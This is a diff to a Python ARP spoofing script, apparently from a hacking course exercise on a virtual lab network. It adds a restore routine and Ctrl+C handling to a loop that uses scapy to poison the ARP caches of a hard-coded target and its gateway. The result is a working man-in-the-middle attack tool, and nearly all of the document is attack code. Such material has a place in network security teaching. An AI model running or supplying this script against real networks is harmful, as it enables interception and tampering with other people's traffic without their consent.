@@ -6,7 +6,7 @@ import sys
 
 target_ip = "10.0.2.15"
 target_mac = "08:00:27:70:92:1d"
-router_ip = "10.0.2.1"
+gateway_ip = "10.0.2.1"
 
 
 def get_mac(ip):
@@ -31,12 +31,22 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+def restore(destination_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
+    scapy.send(packet, verbose=False, count=4)
+
+
 sent_packets_count = 0
-while True:
-    spoof(target_ip, router_ip)
-    spoof(router_ip, target_ip)
-    sent_packets_count += 2
-    print("\r[+] Packets sent: " + str(sent_packets_count)),  # python 2
-    # print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # python3
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print("\r[+] Packets sent: " + str(sent_packets_count)),  # python 2
+        # print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # python3
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
